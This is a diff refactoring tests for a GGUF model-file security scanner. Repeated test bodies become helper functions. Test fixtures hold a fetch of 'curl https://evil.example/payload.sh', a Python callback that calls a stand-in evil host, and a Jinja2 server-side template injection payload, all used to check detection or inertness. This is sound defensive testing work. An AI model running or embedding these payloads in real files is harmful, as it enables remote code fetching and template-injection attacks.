@@ -33,6 +33,7 @@ from modelaudit.scanners.gguf_scanner import (
 )
 from tests.cli_output import parse_click_json_output
 from tests.helpers import create_malicious_pickle, create_mock_gguf
+from tests.helpers.cache import single_file_metadata as _single_file_metadata
 
 _RANK_262_TOKENIZER_ITEM_COUNT = 262_144
 
@@ -343,10 +344,6 @@ def _write_rank_262_shaped_tokenizer_gguf(path: Path) -> None:
             ),
         ],
     )
-
-
-def _single_file_metadata(aggregate: Any) -> Any:
-    return next(iter(aggregate.file_metadata.values()))
 
 
 def _assert_inconclusive_exit2(aggregate: Any, reason: str) -> None:
@@ -827,36 +824,14 @@ def test_gguf_scanner_delegates_named_chat_templates_to_jinja_analysis(tmp_path:
 
 
 def test_gguf_scanner_keeps_benign_chat_templates_clean(tmp_path: Path) -> None:
-    path = create_mock_gguf(
-        tmp_path / "benign.gguf",
-        metadata={
-            "tokenizer.chat_template": "{% for message in messages %}{{ message['content'] }}{% endfor %}",
-        },
-    )
-
-    result = GgufScanner().scan(str(path))
-
-    assert any(check.name == "Jinja2 SSTI Analysis" and check.status == CheckStatus.PASSED for check in result.checks)
-    assert not any(
-        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
-        for check in result.checks
+    _assert_gguf_benign_template(
+        tmp_path, ("benign.gguf"), ("{% for message in messages %}{{ message['content'] }}{% endfor %}")
     )
 
 
 def test_gguf_scanner_keeps_benign_macro_chat_templates_clean(tmp_path: Path) -> None:
-    path = create_mock_gguf(
-        tmp_path / "benign-macro.gguf",
-        metadata={
-            "tokenizer.chat_template": "{% macro render(message) %}{{ message['content'] }}{% endmacro %}",
-        },
-    )
-
-    result = GgufScanner().scan(str(path))
-
-    assert any(check.name == "Jinja2 SSTI Analysis" and check.status == CheckStatus.PASSED for check in result.checks)
-    assert not any(
-        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
-        for check in result.checks
+    _assert_gguf_benign_template(
+        tmp_path, ("benign-macro.gguf"), ("{% macro render(message) %}{{ message['content'] }}{% endmacro %}")
     )
 
 
@@ -1976,27 +1951,13 @@ def test_gguf_metadata_remote_fetch_detects_url_assignment_after_many_benign_url
 def test_gguf_metadata_remote_fetch_detects_alias_after_many_benign_aliases(tmp_path: Path) -> None:
     benign_aliases = "\n".join(f"import requests as r{index}" for index in range(8))
     value = f"{benign_aliases}\nimport requests as target_client\ntarget_client.delete('https://evil.example/payload')"
-    path = create_mock_gguf(tmp_path / "capped-client-aliases.gguf", metadata={"callback": value})
-
-    result = GgufScanner().scan(str(path))
-
-    checks = _failed_metadata_value_checks(result)
-    assert checks
-    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
-    assert all(check.rule_code == "S902" for check in checks)
+    _assert_remote_fetch_alias(tmp_path, value, "capped-client-aliases.gguf")
 
 
 def test_gguf_metadata_remote_fetch_detects_alias_after_truncated_alias_window(tmp_path: Path) -> None:
     benign_aliases = "\n".join(f"import requests as r{index}" for index in range(20))
     value = f"{benign_aliases}\nimport requests as target_client\ntarget_client.delete('https://evil.example/payload')"
-    path = create_mock_gguf(tmp_path / "truncated-client-aliases.gguf", metadata={"callback": value})
-
-    result = GgufScanner().scan(str(path))
-
-    checks = _failed_metadata_value_checks(result)
-    assert checks
-    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
-    assert all(check.rule_code == "S902" for check in checks)
+    _assert_remote_fetch_alias(tmp_path, value, "truncated-client-aliases.gguf")
 
 
 def test_gguf_metadata_remote_fetch_detects_later_alias_after_benign_omitted_alias(tmp_path: Path) -> None:
@@ -2007,14 +1968,7 @@ def test_gguf_metadata_remote_fetch_detects_later_alias_after_benign_omitted_ali
         "import requests as target_client\n"
         "target_client.delete('https://evil.example/payload')"
     )
-    path = create_mock_gguf(tmp_path / "capped-later-client-alias.gguf", metadata={"callback": value})
-
-    result = GgufScanner().scan(str(path))
-
-    checks = _failed_metadata_value_checks(result)
-    assert checks
-    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
-    assert all(check.rule_code == "S902" for check in checks)
+    _assert_remote_fetch_alias(tmp_path, value, "capped-later-client-alias.gguf")
 
 
 def test_gguf_metadata_remote_fetch_detects_function_alias_after_many_benign_aliases(tmp_path: Path) -> None:
@@ -2022,14 +1976,7 @@ def test_gguf_metadata_remote_fetch_detects_function_alias_after_many_benign_ali
     value = (
         f"{benign_aliases}\nfrom requests import delete as target_delete\ntarget_delete('https://evil.example/payload')"
     )
-    path = create_mock_gguf(tmp_path / "capped-function-aliases.gguf", metadata={"callback": value})
-
-    result = GgufScanner().scan(str(path))
-
-    checks = _failed_metadata_value_checks(result)
-    assert checks
-    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
-    assert all(check.rule_code == "S902" for check in checks)
+    _assert_remote_fetch_alias(tmp_path, value, "capped-function-aliases.gguf")
 
 
 @pytest.mark.parametrize(
@@ -2388,49 +2335,23 @@ def test_gguf_nested_metadata_array_strings_are_scanned_without_flagging_benign_
 
 
 def test_gguf_tokenizer_vocabulary_array_strings_are_inert_metadata(tmp_path: Path) -> None:
-    path = tmp_path / "tokenizer-vocabulary-array.gguf"
-    _write_gguf_raw_metadata_entries(
-        path,
-        [
-            (
-                "tokenizer.ggml.tokens",
-                9,
-                _encode_gguf_array(
-                    8,
-                    _encode_gguf_string("curl https://evil.example/payload.sh")
-                    + _encode_gguf_string("{{ ''.__class__.__mro__[1].__subclasses__() }}"),
-                    2,
-                ),
-            )
-        ],
+    _assert_gguf_inert_tokenizer_array(
+        tmp_path,
+        ("tokenizer-vocabulary-array.gguf"),
+        ("tokenizer.ggml.tokens"),
+        ("curl https://evil.example/payload.sh"),
+        ("{{ ''.__class__.__mro__[1].__subclasses__() }}"),
     )
-
-    result = GgufScanner().scan(str(path))
-
-    assert _failed_metadata_value_checks(result) == []
 
 
 def test_gguf_tokenizer_merges_array_strings_are_inert_metadata(tmp_path: Path) -> None:
-    path = tmp_path / "tokenizer-merges-array.gguf"
-    _write_gguf_raw_metadata_entries(
-        path,
-        [
-            (
-                "tokenizer.ggml.merges",
-                9,
-                _encode_gguf_array(
-                    8,
-                    _encode_gguf_string("../ordinary-tokenizer-merge")
-                    + _encode_gguf_string("curl https://evil.example/payload.sh"),
-                    2,
-                ),
-            )
-        ],
+    _assert_gguf_inert_tokenizer_array(
+        tmp_path,
+        ("tokenizer-merges-array.gguf"),
+        ("tokenizer.ggml.merges"),
+        ("../ordinary-tokenizer-merge"),
+        ("curl https://evil.example/payload.sh"),
     )
-
-    result = GgufScanner().scan(str(path))
-
-    assert _failed_metadata_value_checks(result) == []
 
 
 @pytest.mark.parametrize("key", ["tokenizer.ggml.tokens.payload", "tokenizer.ggml.merges.payload"])
@@ -3526,3 +3447,55 @@ def test_gguf_ggml_ignores_stray_end_of_central_directory_bytes(tmp_path: Path, 
 
     assert not any("Polyglot" in check.name for check in result.checks)
     assert not any(issue.rule_code == "S908" for issue in result.issues)
+
+
+def _assert_gguf_inert_tokenizer_array(
+    tmp_path: Path, filename: str, metadata_key: str, first_value: str, second_value: str
+) -> None:
+    path = tmp_path / filename
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                metadata_key,
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string(first_value) + _encode_gguf_string(second_value),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+
+
+def _assert_gguf_benign_template(tmp_path: Path, filename: str, template: str) -> None:
+    path = create_mock_gguf(
+        tmp_path / filename,
+        metadata={
+            "tokenizer.chat_template": template,
+        },
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert any(check.name == "Jinja2 SSTI Analysis" and check.status == CheckStatus.PASSED for check in result.checks)
+    assert not any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def _assert_remote_fetch_alias(tmp_path: Path, value: str, filename: str) -> None:
+    path = create_mock_gguf(tmp_path / filename, metadata={"callback": value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == "remote_fetch" for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
